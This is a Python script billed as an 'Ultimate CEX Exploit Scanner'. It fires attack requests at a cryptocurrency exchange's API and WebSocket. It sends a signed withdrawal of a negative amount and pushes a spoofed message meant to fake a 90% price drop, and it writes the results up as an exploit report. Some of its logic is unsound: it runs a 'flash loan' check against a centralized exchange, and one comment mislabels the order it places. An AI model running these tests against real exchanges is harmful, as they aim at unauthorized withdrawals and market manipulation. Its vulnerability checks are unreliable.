#!/usr/bin/env python3
import websockets  # Required for WebSocket tests
import requests    # Required for API tests
import asyncio     # Required for async operations
import json        # Required for payload handling
import argparse
import csv
import hmac
import hashlib
import random
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
TEST_CASES = {
    "API": [
        "/api/v3/withdraw",
        "/api/v3/order",
        "/api/v3/account"
    ],
    "WS": [
        "orderbook",
        "trades",
        "account"
    ]
}

class CEXSuperScanner:
    def __init__(self, api_url, ws_url, api_key, api_secret):
        self.api_url = api_url.rstrip('/')
        self.ws_url = ws_url
        self.api_key = api_key
        self.api_secret = api_secret
        self.results = []
        self.symbol = "BTC-USDT"  # Default symbol for testing

    def _sign_request(self, endpoint, payload={}):
        nonce = str(int(time.time() * 1000))
        message = f"{nonce}{self.api_key}{endpoint}{json.dumps(payload)}"
        return hmac.new(self.api_secret.encode(), message.encode(), hashlib.sha256).hexdigest()

    # --- ADVANCED EXPLOIT MODULES ---
    async def test_flash_loan_conditions(self):
        """Detect potential flash loan vulnerabilities"""
        try:
            # Get order book depth
            depth = requests.get(f"{self.api_url}/api/v3/depth?symbol={self.symbol}").json()
            bid_ask_spread = float(depth['asks'][0][0]) - float(depth['bids'][0][0])
            
            if bid_ask_spread < 0.001:  # Abnormal tight spread
                self.results.append({
                    "type": "FLASH_LOAN",
                    "status": "CRITICAL",
                    "details": f"Tight spread ({bid_ask_spread}) allows potential arbitrage"
                })
        except Exception as e:
            self.results.append({
                "type": "FLASH_LOAN",
                "status": "ERROR",
                "details": str(e)
            })

    def test_negative_withdrawal(self):
        """Attempt to withdraw negative amounts"""
        try:
            payload = {
                "amount": -1000,  # Negative value
                "address": "0xDEADBEEF",
                "currency": "BTC"
            }
            headers = {
                "X-API-KEY": self.api_key,
                "X-API-SIGNATURE": self._sign_request("/api/v3/withdraw", payload),
                "Content-Type": "application/json"
            }
            response = requests.post(
                f"{self.api_url}/api/v3/withdraw",
                headers=headers,
                json=payload
            )
            
            if response.status_code == 200:
                self.results.append({
                    "type": "WITHDRAWAL",
                    "test": "negative_amount",
                    "status": "CRITICAL",
                    "details": "Exchange accepted negative withdrawal amount!"
                })
        except Exception as e:
            self.results.append({
                "type": "WITHDRAWAL",
                "status": "ERROR",
                "details": str(e)
            })

    async def test_frontrunning(self):
        """Simulate front-running attack"""
        try:
            async with websockets.connect(self.ws_url) as ws:
                # Place genuine small order
                await ws.send(json.dumps({
                    "op": "order",
                    "args": [self.symbol, "buy", "0.01", "100"]  # Buy 100 BTC at 0.01
                }))
                
                # Immediately spoof price drop
                await ws.send(json.dumps({
                    "op": "update",
                    "args": [{
                        "symbol": self.symbol,
                        "price": "0.001",  # 90% price drop
                        "quantity": "10000"
                    }]
                }))
                
                self.results.append({
                    "type": "FRONT_RUNNING",
                    "status": "POTENTIAL",
                    "details": "Price manipulation attempted - verify exchange matching engine"
                })
        except Exception as e:
            self.results.append({
                "type": "FRONT_RUNNING",
                "status": "ERROR",
                "details": str(e)
            })

    # --- CORE SCANNER ---
    def generate_report(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(f"cex_exploit_report_{timestamp}.json", "w") as f:
            json.dump(self.results, f, indent=2)
        with open(f"cex_exploit_report_{timestamp}.csv", "w") as f:
            writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
            writer.writeheader()
            writer.writerows(self.results)

    async def run_audit(self):
        """Execute all exploit tests"""
        # Advanced modules
        await asyncio.gather(
            self.test_flash_loan_conditions(),
            self.test_frontrunning()
        )
        
        # Basic tests
        self.test_negative_withdrawal()
        self.generate_report()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ultimate CEX Exploit Scanner")
    parser.add_argument("--api-url", required=True)
    parser.add_argument("--ws-url", required=True)
    parser.add_argument("--api-key", required=True)
    parser.add_argument("--api-secret", required=True)
    args = parser.parse_args()

    scanner = CEXSuperScanner(
        args.api_url,
        args.ws_url,
        args.api_key,
        args.api_secret
    )
    asyncio.run(scanner.run_audit())
